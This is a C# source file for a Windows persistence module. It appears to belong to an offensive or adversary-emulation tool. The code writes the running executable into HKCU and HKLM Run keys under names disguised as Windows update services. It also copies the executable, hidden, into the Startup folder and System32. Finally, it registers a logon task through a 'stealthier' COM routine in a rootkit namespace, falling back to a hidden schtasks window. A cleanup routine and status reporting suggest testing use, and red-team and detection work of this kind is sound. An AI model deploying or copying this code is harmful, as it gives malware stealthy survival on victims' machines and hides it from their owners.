using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using XYZ.modules.reporters;

namespace XYZ.modules
{
    public class PersistenceModule : IDisposable
    {
        private bool isDisposed = false;
        private List<string> createdFiles = new List<string>();
        private List<string> registryKeys = new List<string>();
        private string scheduledTaskName = "";
        
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);
        
        private const uint FILE_ATTRIBUTE_HIDDEN = 0x2;
        private const uint FILE_ATTRIBUTE_SYSTEM = 0x4;
        
        public void ApplyPersistence()
        {
            try
            {
                ApplyRegistryPersistence();
                ApplyFileSystemPersistence();
                ApplyScheduledTaskPersistence();
            }
            catch (Exception)
            {
            }
        }
        
        private void ApplyRegistryPersistence()
        {
            string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string valueName = "WindowsUpdateService";

            // HKCU
            string hkcuKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            try
            {
                using (RegistryKey hkcu = Registry.CurrentUser.OpenSubKey(hkcuKey, true))
                {
                    if (hkcu != null)
                    {
                        hkcu.SetValue(valueName, exePath);
                        registryKeys.Add(@"HKCU\" + hkcuKey + @"\" + valueName);
                        PersistenceReporter.ReportRegistry("HKCU\\" + hkcuKey, valueName, true);
                    }
                }
            }
            catch (Exception ex)
            {
                PersistenceReporter.ReportRegistry("HKCU\\" + hkcuKey, valueName, false, ex.Message);
            }

            // HKLM
            string hklmKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
            try
            {
                using (RegistryKey hklm = Registry.LocalMachine.OpenSubKey(hklmKey, true))
                {
                    if (hklm != null)
                    {
                        string sysValueName = "WindowsSystemService";
                        hklm.SetValue(sysValueName, exePath);
                        registryKeys.Add(@"HKLM\" + hklmKey + @"\" + sysValueName);
                        PersistenceReporter.ReportRegistry("HKLM\\" + hklmKey, sysValueName, true);
                    }
                }
            }
            catch (Exception ex)
            {
                PersistenceReporter.ReportRegistry("HKLM\\" + hklmKey, "WindowsSystemService", false, ex.Message);
            }
        }
        
        private void ApplyFileSystemPersistence()
        {
            string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            string fileName = Path.GetFileName(exePath);

            // Startup Folder
            string appDataPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
            
            try
            {
                if (Directory.Exists(appDataPath))
                {
                    string targetPath = Path.Combine(appDataPath, fileName);
                    if (!File.Exists(targetPath))
                    {
                        File.Copy(exePath, targetPath, true);
                        createdFiles.Add(targetPath);
                        SetFileAttributes(targetPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        PersistenceReporter.ReportStartupFolder(targetPath, true);
                    }
                }
            }
            catch (Exception ex)
            {
                PersistenceReporter.ReportStartupFolder(Path.Combine(appDataPath, fileName), false, ex.Message);
            }

            // System Folder attempt
            string systemPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System),
                fileName);
            
            try
            {
                if (!File.Exists(systemPath))
                {
                    File.Copy(exePath, systemPath, true);
                    createdFiles.Add(systemPath);
                    SetFileAttributes(systemPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    PersistenceReporter.Report("system_folder", systemPath, true);
                }
            }
            catch (Exception ex)
            {
                 PersistenceReporter.Report("system_folder", systemPath, false, ex.Message);
            }
        }
        
        private void ApplyScheduledTaskPersistence()
        {
            string taskName = "WindowsUpdateService";
            string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
            
            // Try COM method first (Stealthier)
            if (XYZ.modules.rootkit.TaskSchedulerCOM.CreateTask(taskName, exePath))
            {
                return;
            }

            // Fallback to schtasks.exe
            try
            {
                scheduledTaskName = taskName;
                
                string schtasksCommand = "/create /tn \"" + taskName + "\" /tr \"" + exePath + "\" /sc onlogon /f";
                
                ProcessStartInfo psi = new ProcessStartInfo("schtasks", schtasksCommand)
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                
                Process proc = Process.Start(psi);
                proc.WaitForExit();
                
                if (proc.ExitCode == 0)
                {
                    PersistenceReporter.ReportScheduledTask(taskName, true, "Used fallback schtasks.exe");
                }
                else
                {
                    PersistenceReporter.ReportScheduledTask(taskName, false, "Fallback schtasks failed: " + proc.ExitCode);
                }
            }
            catch (Exception ex)
            {
                PersistenceReporter.ReportScheduledTask(taskName, false, ex.Message);
            }
        }
        
        public void RevertChanges()
        {
            try
            {
                foreach (string filePath in createdFiles)
                {
                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                    }
                }
                
                foreach (string registryPath in registryKeys)
                {
                    try
                    {
                        if (registryPath.StartsWith(@"HKCU\"))
                        {
                            string[] parts = registryPath.Substring(5).Split(new char[] { '\\' }, 2);
                            string keyPath = parts[0];
                            string valueName = parts[1];
                            
                            RegistryKey key = Registry.CurrentUser.OpenSubKey(keyPath, true);
                            if (key != null)
                            {
                                key.DeleteValue(valueName, false);
                                key.Close();
                            }
                        }
                        else if (registryPath.StartsWith(@"HKLM\"))
                        {
                            string[] parts = registryPath.Substring(5).Split(new char[] { '\\' }, 2);
                            string keyPath = parts[0];
                            string valueName = parts[1];
                            
                            RegistryKey key = Registry.LocalMachine.OpenSubKey(keyPath, true);
                            if (key != null)
                            {
                                key.DeleteValue(valueName, false);
                                key.Close();
                            }
                        }
                    }
                    catch (Exception)
                    {
                    }
                }
                
                if (!string.IsNullOrEmpty(scheduledTaskName))
                {
                    string schtasksCommand = "/delete /tn \"" + scheduledTaskName + "\" /f";
                    
                    ProcessStartInfo psi = new ProcessStartInfo("schtasks", schtasksCommand)
                    {
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    
                    Process proc = Process.Start(psi);
                    proc.WaitForExit();
                }
            }
            catch (Exception)
            {
            }
        }
        
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
        
        protected virtual void Dispose(bool disposing)
        {
            if (!isDisposed)
            {
                if (disposing)
                {
                    RevertChanges();
                }
                
                isDisposed = true;
            }
        }
        
        ~PersistenceModule()
        {
            Dispose(false);
        }
    }
}